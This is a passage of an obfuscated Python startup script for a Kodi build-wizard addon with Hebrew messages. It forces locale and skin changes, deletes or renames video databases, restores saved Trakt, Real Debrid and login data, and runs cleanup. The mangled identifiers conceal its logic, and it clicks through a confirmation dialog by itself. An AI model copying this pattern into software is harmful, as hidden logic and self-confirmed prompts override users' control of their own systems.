			O0OO0O0OOO00OO000 .close ()#line:563
		except :#line:564
				pass #line:565
		wiz .kodi17Fix ()#line:566
		OO00O0O00000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:567
		try :#line:568
			O0OO0O0OOO00OO000 =open (OO00O0O00000O000O ,'r')#line:569
			OOO0OOO0OOOOOO0O0 =O0OO0O0OOO00OO000 .read ()#line:570
			O0OO0O0OOO00OO000 .close ()#line:571
			OOO00OOOOO00000O0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:572
			OOO0O00OOOO000O0O =re .compile (OOO00OOOOO00000O0 ).findall (OOO0OOO0OOOOOO0O0 )[0 ]#line:573
			O0OO0O0OOO00OO000 =open (OO00O0O00000O000O ,'w')#line:574
			O0OO0O0OOO00OO000 .write (OOO0OOO0OOOOOO0O0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO0O00OOOO000O0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:575
			O0OO0O0OOO00OO000 .close ()#line:576
		except :#line:577
				pass #line:578
		swapSkins ('skin.Premium.mod')#line:579
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:580
	os ._exit (1 )#line:581
def fix18update ():#line:582
	if KODIV >=18 :#line:583
		xbmc .sleep (4000 )#line:584
		if BUILDNAME =="":#line:585
			try :#line:586
				os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:587
			except :#line:588
				pass #line:589
		try :#line:590
			O000OO0O00OOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:591
			O0O0000O0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:592
			os .rename (O000OO0O00OOO0OO0 ,O0O0000O0000O0OOO )#line:593
		except :#line:594
				pass #line:595
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:596
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:597
		fixfont ()#line:598
		OO00OO0OOOO00OOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:599
		try :#line:600
			OOO00000OOO00000O =open (OO00OO0OOOO00OOOO ,'r')#line:601
			OO00OO00000O00OOO =OOO00000OOO00000O .read ()#line:602
			OOO00000OOO00000O .close ()#line:603
			O0000OO000O0OO00O ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:604
			OOO0O0OO00O00O00O =re .compile (O0000OO000O0OO00O ).findall (OO00OO00000O00OOO )[0 ]#line:605
			OOO00000OOO00000O =open (OO00OO0OOOO00OOOO ,'w')#line:606
			OOO00000OOO00000O .write (OO00OO00000O00OOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOO0O0OO00O00O00O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:607
			OOO00000OOO00000O .close ()#line:608
		except :#line:609
				pass #line:610
		wiz .kodi17Fix ()#line:611
		OO00OO0OOOO00OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:612
		try :#line:613
			OOO00000OOO00000O =open (OO00OO0OOOO00OOOO ,'r')#line:614
			OO00OO00000O00OOO =OOO00000OOO00000O .read ()#line:615
			OOO00000OOO00000O .close ()#line:616
			O0000OO000O0OO00O ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:617
			OOO0O0OO00O00O00O =re .compile (O0000OO000O0OO00O ).findall (OO00OO00000O00OOO )[0 ]#line:618
			OOO00000OOO00000O =open (OO00OO0OOOO00OOOO ,'w')#line:619
			OOO00000OOO00000O .write (OO00OO00000O00OOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOO0O0OO00O00O00O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:620
			OOO00000OOO00000O .close ()#line:621
		except :#line:622
				pass #line:623
		swapSkins ('skin.Premium.mod')#line:624
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:625
	os ._exit (1 )#line:626
def swapSkins (OO0OOOOOO0O0O0O00 ,title ="Error"):#line:627
	OOO00O000OOOOOO0O ='lookandfeel.skin'#line:628
	OO00O0O0O0O000O00 =OO0OOOOOO0O0O0O00 #line:629
	O00O00OO0OOO0O00O =getOld (OOO00O000OOOOOO0O )#line:630
	O0O0OOO0OO000O000 =OOO00O000OOOOOO0O #line:631
	setNew (O0O0OOO0OO000O000 ,OO00O0O0O0O000O00 )#line:632
	O0O00OO0O0000OO0O =0 #line:633
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00OO0O0000OO0O <100 :#line:634
		O0O00OO0O0000OO0O +=1 #line:635
		xbmc .sleep (1 )#line:636
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:637
		xbmc .executebuiltin ('SendClick(11)')#line:638
	return True #line:639
def getOld (O00O0OOOOOO0OOOO0 ):#line:641
	try :#line:642
		O00O0OOOOOO0OOOO0 ='"%s"'%O00O0OOOOOO0OOOO0 #line:643
		O0OOO0OO0O0O0OO00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00O0OOOOOO0OOOO0 )#line:644
		O0OOOOO0OO000OO00 =xbmc .executeJSONRPC (O0OOO0OO0O0O0OO00 )#line:646
		O0OOOOO0OO000OO00 =simplejson .loads (O0OOOOO0OO000OO00 )#line:647
		if O0OOOOO0OO000OO00 .has_key ('result'):#line:648
			if O0OOOOO0OO000OO00 ['result'].has_key ('value'):#line:649
				return O0OOOOO0OO000OO00 ['result']['value']#line:650
	except :#line:651
		pass #line:652
	return None #line:653
def setNew (O000O0O00OO00O0O0 ,OO000O000OOOO0OO0 ):#line:656
	try :#line:657
		O000O0O00OO00O0O0 ='"%s"'%O000O0O00OO00O0O0 #line:658
		OO000O000OOOO0OO0 ='"%s"'%OO000O000OOOO0OO0 #line:659
		O0O0O00O0OOO0O00O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O000O0O00OO00O0O0 ,OO000O000OOOO0OO0 )#line:660
		O00OO000O0O0OO000 =xbmc .executeJSONRPC (O0O0O00O0OOO0O00O )#line:662
	except :#line:663
		pass #line:664
	return None #line:665
def idle ():#line:666
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:667
def fixfont ():#line:668
	OOOO00O0O0O0000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:669
	O0OO0O0OOO00OO00O =json .loads (OOOO00O0O0O0000O0 );#line:671
	OO00O0000O00000O0 =O0OO0O0OOO00OO00O ["result"]["settings"]#line:672
	O000O0O000OO0OOOO =[O0OO0OO0OOO00OOOO for O0OO0OO0OOO00OOOO in OO00O0000O00000O0 if O0OO0OO0OOO00OOOO ["id"]=="audiooutput.audiodevice"][0 ]#line:674
	OOOOO000OO0OO0OOO =O000O0O000OO0OOOO ["options"];#line:675
	OO00O00OOO0OOO00O =O000O0O000OO0OOOO ["value"];#line:676
	OOO0O0O0O0O00OO0O =[O0OOOO0OOO0OO000O for (O0OOOO0OOO0OO000O ,OOOO00OOOO00O0OO0 )in enumerate (OOOOO000OO0OO0OOO )if OOOO00OOOO00O0OO0 ["value"]==OO00O00OOO0OOO00O ][0 ];#line:678
	OO000O0OO000OO0O0 =(OOO0O0O0O0O00OO0O +1 )%len (OOOOO000OO0OO0OOO )#line:680
	O0O0OO0OOO0O0O0OO =OOOOO000OO0OO0OOO [OO000O0OO000OO0O0 ]["value"]#line:682
	O000OO0O0000OO00O =OOOOO000OO0OO0OOO [OO000O0OO000OO0O0 ]["label"]#line:683
	O000OO0O00O0OO0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:685
	try :#line:687
		O00O0O000O0000OO0 =json .loads (O000OO0O00O0OO0O0 );#line:688
		if O00O0O000O0000OO0 ["result"]!=True :#line:690
			raise Exception #line:691
	except :#line:692
		sys .stderr .write ("Error switching audio output device")#line:693
		raise Exception #line:694
def checkSkin ():#line:697
	wiz .log ("[Build Check] Invalid Skin Check Start")#line:698
	OOOOOO00O0O0OO0O0 =wiz .getS ('defaultskin')#line:699
	O0000O00OOO0O0O00 =wiz .getS ('defaultskinname')#line:700
	O000O00O000OOO0O0 =wiz .getS ('defaultskinignore')#line:701
	O00OO0O0OOOOO0OOO =False #line:702
	if not OOOOOO00O0O0OO0O0 =='':#line:703
		if os .path .exists (os .path .join (ADDONS ,OOOOOO00O0O0OO0O0 )):#line:704
			if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to set the skin back to:[/COLOR]",'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000O00OOO0O0O00 )):#line:705
				O00OO0O0OOOOO0OOO =OOOOOO00O0O0OO0O0 #line:706
				O00OO0000000O0O00 =O0000O00OOO0O0O00 #line:707
			else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true');O00OO0O0OOOOO0OOO =False #line:708
		else :wiz .setS ('defaultskin','');wiz .setS ('defaultskinname','');OOOOOO00O0O0OO0O0 ='';O0000O00OOO0O0O00 =''#line:709
	if OOOOOO00O0O0OO0O0 =='':#line:710
		OOOO0OOO000O0O0OO =[]#line:711
		O0O0OOOO0O0OOOO00 =[]#line:712
		for O0000OOOOO0000OOO in glob .glob (os .path .join (ADDONS ,'skin.*/')):#line:713
			OO00O0OO00OOOOO0O ="%s/addon.xml"%O0000OOOOO0000OOO #line:714
			if os .path .exists (OO00O0OO00OOOOO0O ):#line:715
				OOOOO00O00OOOOOOO =open (OO00O0OO00OOOOO0O ,mode ='r');OO0O0OOOO00O00000 =OOOOO00O00OOOOOOO .read ().replace ('\n','').replace ('\r','').replace ('\t','');OOOOO00O00OOOOOOO .close ();#line:716
				OOOOOOO00O00O00O0 =wiz .parseDOM (OO0O0OOOO00O00000 ,'addon',ret ='id')#line:717
				OOOO0000O000O0OO0 =wiz .parseDOM (OO0O0OOOO00O00000 ,'addon',ret ='name')#line:718
				wiz .log ("%s: %s"%(O0000OOOOO0000OOO ,str (OOOOOOO00O00O00O0 [0 ])),xbmc .LOGNOTICE )#line:719
				if len (OOOOOOO00O00O00O0 )>0 :O0O0OOOO0O0OOOO00 .append (str (OOOOOOO00O00O00O0 [0 ]));OOOO0OOO000O0O0OO .append (str (OOOO0000O000O0OO0 [0 ]))#line:720
				else :wiz .log ("ID not found for %s"%O0000OOOOO0000OOO ,xbmc .LOGNOTICE )#line:721
			else :wiz .log ("ID not found for %s"%O0000OOOOO0000OOO ,xbmc .LOGNOTICE )#line:722
		if len (O0O0OOOO0O0OOOO00 )>0 :#line:723
			if len (O0O0OOOO0O0OOOO00 )>1 :#line:724
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to view a list of avaliable skins?[/COLOR]"):#line:725
					O000O00OO0O0O00OO =DIALOG .select ("Select skin to switch to!",OOOO0OOO000O0O0OO )#line:726
					if O000O00OO0O0O00OO ==-1 :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:727
					else :#line:728
						O00OO0O0OOOOO0OOO =O0O0OOOO0O0OOOO00 [O000O00OO0O0O00OO ]#line:729
						O00OO0000000O0O00 =OOOO0OOO000O0O0OO [O000O00OO0O0O00OO ]#line:730
				else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:731
	if O00OO0O0OOOOO0OOO :#line:738
		skinSwitch .swapSkins (O00OO0O0OOOOO0OOO )#line:739
		O000O00OO00O00OOO =0 #line:740
		xbmc .sleep (1000 )#line:741
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O00OO00O00OOO <150 :#line:742
			O000O00OO00O00OOO +=1 #line:743
			xbmc .sleep (200 )#line:744
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:746
			wiz .ebi ('SendClick(11)')#line:747
			wiz .lookandFeelData ('restore')#line:748
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Skin Swap Timed Out![/COLOR]'%COLOR2 )#line:749
	wiz .log ("[Build Check] Invalid Skin Check End",xbmc .LOGNOTICE )#line:750
while xbmc .Player ().isPlayingVideo ():#line:752
	xbmc .sleep (1000 )#line:753
if KODIV >=17 :#line:755
	NOW =datetime .now ()#line:756
	temp =wiz .getS ('kodi17iscrap')#line:757
	if not temp =='':#line:758
		if temp >str (NOW -timedelta (minutes =2 )):#line:759
			wiz .log ("Killing Start Up Script")#line:760
			sys .exit ()#line:761
	wiz .log ("%s"%(NOW ))#line:762
	wiz .setS ('kodi17iscrap',str (NOW ))#line:763
	xbmc .sleep (1000 )#line:764
	if not wiz .getS ('kodi17iscrap')==str (NOW ):#line:765
		wiz .log ("Killing Start Up Script")#line:766
		sys .exit ()#line:767
	else :#line:768
		wiz .log ("Continuing Start Up Script")#line:769
wiz .log ("[Path Check] Started",xbmc .LOGNOTICE )#line:771
path =os .path .split (ADDONPATH )#line:772
if not ADDONID ==path [1 ]:DIALOG .ok (ADDONTITLE ,'[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]'%COLOR2 ,'[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,ADDONID ),'[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,path ));wiz .log ("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s "%(ADDONID ,path ))#line:773
else :wiz .log ("[Path Check] Good!",xbmc .LOGNOTICE )#line:774
if KODIADDONS in ADDONPATH :#line:777
	wiz .log ("Copying path to addons dir",xbmc .LOGNOTICE )#line:778
	if not os .path .exists (ADDONS ):os .makedirs (ADDONS )#line:779
	newpath =xbmc .translatePath (os .path .join ('special://home/addons/',ADDONID ))#line:780
	if os .path .exists (newpath ):#line:781
		wiz .log ("Folder already exists, cleaning House",xbmc .LOGNOTICE )#line:782
		wiz .cleanHouse (newpath )#line:783
		wiz .removeFolder (newpath )#line:784
	try :#line:785
		wiz .copytree (ADDONPATH ,newpath )#line:786
	except Exception as e :#line:787
		pass #line:788
	wiz .forceUpdate (True )#line:789
try :#line:791
	mybuilds =xbmc .translatePath (MYBUILDS )#line:792
	if not os .path .exists (mybuilds ):xbmcvfs .mkdirs (mybuilds )#line:793
except :#line:794
	pass #line:795
wiz .log ("[Installed Check] Started",xbmc .LOGNOTICE )#line:797
if KODIV >=17 and SKIN in ['skin.confluence','skin.estuary','skin.estouchy']and not BUILDNAME =="":#line:801
			wiz .kodi17Fix ()#line:802
			fix18update ()#line:803
			fix17update ()#line:804
if INSTALLED =='true':#line:807
    input =(ADDON .getSetting ("rdbuild"))#line:808
    if KEEPTRAKT =='true':traktit .traktIt ('restore','all');wiz .log ('[Installed Check] Restoring Trakt Data',xbmc .LOGNOTICE )#line:810
    if KEEPREAL =='true':debridit .debridIt ('restore','all');wiz .log ('[Installed Check] Restoring Real Debrid Data',xbmc .LOGNOTICE )#line:811
    if input =='true':loginit .loginIt ('restore','all');wiz .log ('[Installed Check] Restoring Login Data',xbmc .LOGNOTICE )#line:812
    wiz .clearS ('install')#line:813
wiz .log ("[Notifications] Started",xbmc .LOGNOTICE )#line:898
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:900
	input =(ADDON .getSetting ("autoupdate"))#line:901
	STARTP2 ()#line:902
	if not NOTIFY =='true':#line:903
		url =wiz .workingURL (NOTIFICATION )#line:904
		if url ==True :#line:905
			id ,msg =wiz .splitNotify (NOTIFICATION )#line:906
			if not id ==False :#line:907
				try :#line:908
					id =int (id );NOTEID =int (NOTEID )#line:909
					if id ==NOTEID :#line:910
						if NOTEDISMISS =='false':#line:911
							debridit .debridIt ('update','all')#line:912
							traktit .traktIt ('update','all')#line:913
							checkidupdate ()#line:914
						else :wiz .log ("[Notifications] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:915
					elif id >NOTEID :#line:916
						wiz .log ("[Notifications] id: %s"%str (id ),xbmc .LOGNOTICE )#line:917
						wiz .setS ('noteid',str (id ))#line:918
						wiz .setS ('notedismiss','false')#line:919
						if input =='true':#line:920
							debridit .debridIt ('update','all')#line:921
							traktit .traktIt ('update','all')#line:922
							checkidupdate ()#line:923
						else :notify .notification (msg =msg )#line:924
						wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:925
				except Exception as e :#line:926
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:927
			else :wiz .log ("[Notifications] Text File not formated Correctly")#line:928
		else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,url ),xbmc .LOGNOTICE )#line:929
	else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:930
else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:931
wiz .log ("[Notifications2] Started",xbmc .LOGNOTICE )#line:933
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18":#line:934
	if not NOTIFY2 =='true':#line:935
		url =wiz .workingURL (NOTIFICATION2 )#line:936
		if url ==True :#line:937
			id ,msg =wiz .splitNotify (NOTIFICATION2 )#line:938
			if not id ==False :#line:939
				try :#line:940
					id =int (id );NOTEID2 =int (NOTEID2 )#line:941
					if id ==NOTEID2 :#line:942
						if NOTEDISMISS2 =='false':#line:943
							notify .notification2 (msg )#line:944
						else :wiz .log ("[Notifications2] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:945
					elif id >NOTEID2 :#line:946
						wiz .log ("[Notifications2] id: %s"%str (id ),xbmc .LOGNOTICE )#line:947
						wiz .setS ('noteid2',str (id ))#line:948
						wiz .setS ('notedismiss2','false')#line:949
						notify .notification2 (msg =msg )#line:950
						wiz .log ("[Notifications2] Complete",xbmc .LOGNOTICE )#line:951
				except Exception as e :#line:952
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:953
			else :wiz .log ("[Notifications2] Text File not formated Correctly")#line:954
		else :wiz .log ("[Notifications2] URL(%s): %s"%(NOTIFICATION2 ,url ),xbmc .LOGNOTICE )#line:955
	else :wiz .log ("[Notifications2] Turned Off",xbmc .LOGNOTICE )#line:956
else :wiz .log ("[Notifications2] Not Enabled",xbmc .LOGNOTICE )#line:957
wiz .log ("[Notifications3] Started",xbmc .LOGNOTICE )#line:959
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18"or BUILDNAME ==" Kodi Premium":#line:960
	if not NOTIFY3 =='true':#line:961
		url =wiz .workingURL (NOTIFICATION3 )#line:962
		if url ==True :#line:963
			id ,msg =wiz .splitNotify (NOTIFICATION3 )#line:964
			if not id ==False :#line:965
				try :#line:966
					id =int (id );NOTEID3 =int (NOTEID3 )#line:967
					if id ==NOTEID3 :#line:968
						if NOTEDISMISS3 =='false':#line:969
							notify .notification3 (msg )#line:970
						else :wiz .log ("[Notifications3] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:971
					elif id >NOTEID3 :#line:972
						wiz .log ("[Notifications3] id: %s"%str (id ),xbmc .LOGNOTICE )#line:973
						wiz .setS ('noteid3',str (id ))#line:974
						wiz .setS ('notedismiss3','false')#line:975
						notify .notification3 (msg =msg )#line:976
						wiz .log ("[Notifications3] Complete",xbmc .LOGNOTICE )#line:977
				except Exception as e :#line:978
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:979
			else :wiz .log ("[Notifications3] Text File not formated Correctly")#line:980
		else :wiz .log ("[Notifications3] URL(%s): %s"%(NOTIFICATION3 ,url ),xbmc .LOGNOTICE )#line:981
	else :wiz .log ("[Notifications3] Turned Off",xbmc .LOGNOTICE )#line:982
else :wiz .log ("[Notifications3] Not Enabled",xbmc .LOGNOTICE )#line:983
wiz .log ("[Trakt Data] Started",xbmc .LOGNOTICE )#line:984
if KEEPTRAKT =='true':#line:985
	if TRAKTSAVE <=str (TODAY ):#line:986
		wiz .log ("[Trakt Data] Saving all Data",xbmc .LOGNOTICE )#line:987
		traktit .autoUpdate ('all')#line:988
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:989
	else :#line:990
		wiz .log ("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s"%(TRAKTSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:991
else :wiz .log ("[Trakt Data] Not Enabled",xbmc .LOGNOTICE )#line:992
wiz .log ("[Real Debrid Data] Started",xbmc .LOGNOTICE )#line:994
if KEEPREAL =='true':#line:995
	if REALSAVE <=str (TODAY ):#line:996
		wiz .log ("[Real Debrid Data] Saving all Data",xbmc .LOGNOTICE )#line:997
		debridit .autoUpdate ('all')#line:998
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:999
	else :#line:1000
		wiz .log ("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s"%(REALSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1001
else :wiz .log ("[Real Debrid Data] Not Enabled",xbmc .LOGNOTICE )#line:1002
wiz .log ("[Login Data] Started",xbmc .LOGNOTICE )#line:1004
if KEEPLOGIN =='true':#line:1005
	if LOGINSAVE <=str (TODAY ):#line:1006
		wiz .log ("[Login Data] Saving all Data",xbmc .LOGNOTICE )#line:1007
		loginit .autoUpdate ('all')#line:1008
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:1009
	else :#line:1010
		wiz .log ("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s"%(LOGINSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1011
else :wiz .log ("[Login Data] Not Enabled",xbmc .LOGNOTICE )#line:1012
wiz .log ("[Auto Clean Up] Started",xbmc .LOGNOTICE )#line:1014
if AUTOCLEANUP =='true':#line:1015
	service =False #line:1016
	days =[TODAY ,TOMORROW ,THREEDAYS ,ONEWEEK ]#line:1017
	feq =int (float (AUTOFEQ ))#line:1018
	if AUTONEXTRUN <=str (TODAY )or feq ==0 :#line:1019
		service =True #line:1020
		next_run =days [feq ]#line:1021
		wiz .setS ('nextautocleanup',str (next_run ))#line:1022
	else :wiz .log ("[Auto Clean Up] Next Clean Up %s"%AUTONEXTRUN ,xbmc .LOGNOTICE )#line:1023
	if service ==True :#line:1024
		AUTOCACHE =wiz .getS ('clearcache')#line:1025
		AUTOPACKAGES =wiz .getS ('clearpackages')#line:1026
		AUTOTHUMBS =wiz .getS ('clearthumbs')#line:1027
		if AUTOCACHE =='true':wiz .log ('[Auto Clean Up] Cache: On',xbmc .LOGNOTICE );wiz .clearCache (True )#line:1028
		else :wiz .log ('[Auto Clean Up] Cache: Off',xbmc .LOGNOTICE )#line:1029
		if AUTOTHUMBS =='true':wiz .log ('[Auto Clean Up] Old Thumbs: On',xbmc .LOGNOTICE );wiz .oldThumbs ()#line:1030
		else :wiz .log ('[Auto Clean Up] Old Thumbs: Off',xbmc .LOGNOTICE )#line:1031
		if AUTOPACKAGES =='true':wiz .log ('[Auto Clean Up] Packages: On',xbmc .LOGNOTICE );wiz .clearPackagesStartup ()#line:1032
		else :wiz .log ('[Auto Clean Up] Packages: Off',xbmc .LOGNOTICE )#line:1033
else :wiz .log ('[Auto Clean Up] Turned off',xbmc .LOGNOTICE )#line:1034
wiz .setS ('kodi17iscrap','')#line:1036
for dirpath ,dirnames ,filenames in os .walk (packagesdir ):#line:1105
	count =0 #line:1106
	for f in filenames :#line:1107
		count +=1 #line:1108
		fp =os .path .join (dirpath ,f )#line:1109
		total_size +=os .path .getsize (fp )#line:1110
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1111
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:1118
	for f2 in filenames2 :#line:1119
		fp2 =os .path .join (dirpath2 ,f2 )#line:1120
		total_size2 +=os .path .getsize (fp2 )#line:1121
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1122
if int (total_sizetext2 )>filesize_thumb :#line:1124
	choice2 =xbmcgui .Dialog ().yesno ("[COLOR=red]קודי אנונימוס - ניקוי תמונות פוסטרים ישנות[/COLOR]",'[COLOR red]'+str (total_sizetext2 )+' MB  :גודל התיקיה היא [/COLOR]','מומלץ למחוק את התיקיה בשביל לפנות מקום נוסף במכשיר','האם ברצונך למחוק אותה עכשיו?',yeslabel ='כן',nolabel ='לא')#line:1125
	if choice2 ==1 :#line:1126
		maintenance .deleteThumbnails ()#line:1127
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1129
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1130
if notify_mode =='true':xbmc .executebuiltin ('XBMC.Notification(%s, %s, %s, %s)'%('Maintenance Status','Packages: '+str (total_sizetext )+' MB' ' - Images: '+str (total_sizetext2 )+' MB','5000',iconpath ))#line:1132
time .sleep (3 )#line:1133
